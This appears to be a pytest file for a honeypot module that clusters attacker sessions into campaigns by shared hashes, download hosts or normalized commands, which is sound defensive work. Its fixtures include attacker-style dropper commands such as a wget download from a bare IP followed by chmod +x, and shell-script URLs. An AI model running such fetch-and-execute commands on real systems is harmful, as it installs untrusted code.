from honeycomb.correlation import find_campaigns, normalize_command

def S(sid, ip, **kw):
    return {"session_id": sid, "src_ip": ip, "hashes": [], "urls": [], "commands": [], **kw}

def test_c1_same_hash_two_ips_is_one_campaign():
    out = find_campaigns([S("a", "203.0.113.5", hashes=["AB12"]),
                          S("b", "198.51.100.7", hashes=["ab12"])])
    assert [c["rule"] for c in out] == ["C1"] and out[0]["confidence"] == "high"

def test_same_24_only_is_no_campaign():
    assert find_campaigns([S("a", "203.0.113.5"), S("b", "203.0.113.6")]) == []

def test_same_ip_twice_is_not_campaign():
    assert find_campaigns([S("a", "203.0.113.5", hashes=["x"]),
                           S("b", "203.0.113.5", hashes=["x"])]) == []

def test_changing_hash_removes_campaign():
    a = S("a", "1.1.1.1", hashes=["x"]); b = S("b", "2.2.2.2", hashes=["y"])
    assert find_campaigns([a, b]) == []

def test_c2_same_server_different_url():
    out = find_campaigns([S("a", "1.1.1.1", urls=["http://198.51.100.9/a.sh"]),
                          S("b", "2.2.2.2", urls=["http://198.51.100.9/b.sh"])])
    assert [c["evidence"] for c in out] == ["host:198.51.100.9"]

def test_c3_normalized_commands():
    out = find_campaigns([S("a", "1.1.1.1", commands=["wget  http://9.9.9.9/x", "chmod +x x"]),
                          S("b", "2.2.2.2", commands=["wget http://8.8.8.8/x", "chmod  +x x"])])
    assert [c["rule"] for c in out] == ["C3"] and out[0]["confidence"] == "medium"

def test_c3_single_generic_command_ignored():
    assert find_campaigns([S("a", "1.1.1.1", commands=["ls"]), S("b", "2.2.2.2", commands=["ls"])]) == []

def test_normalize():
    assert normalize_command("  ping   10.0.0.1 ") == "ping <IP>"
